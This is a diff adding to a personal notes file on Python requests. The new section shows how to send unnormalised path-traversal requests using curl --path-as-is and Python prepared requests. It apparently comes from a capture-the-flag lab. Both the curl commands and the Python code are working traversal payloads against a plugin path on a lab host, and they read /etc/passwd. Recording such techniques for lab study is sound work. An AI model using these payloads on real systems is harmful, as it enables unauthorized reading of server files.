@@ -29,3 +29,45 @@ if r.status_code == 200:
 ```
 
 Use requests.content instead of requests.text for bytes-type data.
+[Docs](https://requests.readthedocs.io/en/latest/user/quickstart/#binary-response-content)
+
+---
+
+For sending GET requests without url normalization, use curl with --path-as-is
+
+```bash
+curl http://10.10.11.183:3000/public/plugins/stat/../../../../../../../../etc/passwd --path-as-is -x 127.0.0.1:8080
+```
+
+with requests module in python3, using requests.get will not work. Need to use prepared requests.
+[Docs](https://requests.readthedocs.io/en/latest/user/advanced/#prepared-requests)
+
+```python
+import requests
+
+url = 'http://10.10.11.183:3000/public/plugins/stat/../../../../../../../../etc/passwd'
+proxies = {"http": "127.0.0.1:8080"}
+s = requests.Session()
+req = requests.Request(method='GET', url=url)
+prep = req.prepare()
+prep.url = url
+r = s.send(prep, verify=False, timeout=3)
+# r = s.send(prep, verify=False, timeout=3, proxies=proxies)  # WILL NOT WORK WITH PROXIES
+print(r.text)
+```
+
+> CANNOT using proxies in prepared requests. The url will get normalized!
+
+---
+
+This is working in curl:
+```bash
+curl 10.10.11.183:3000/public/plugins/stat/../../../../../../../../etc/passwd --path-as-is
+```
+
+in Python3, without protocol scheme (http/https) requests will error: No connection adapters were found.
+
+> Without the http:// part, requests has no idea how to connect to the remote server.
+>
+>Note that the protocol scheme must be all lowercase; if your URL starts with HTTP:// for example, it won’t find the http:// connection adapter either.
+> — <cite>[source](https://stackoverflow.com/questions/15115328/python-requests-no-connection-adapters)</cite>
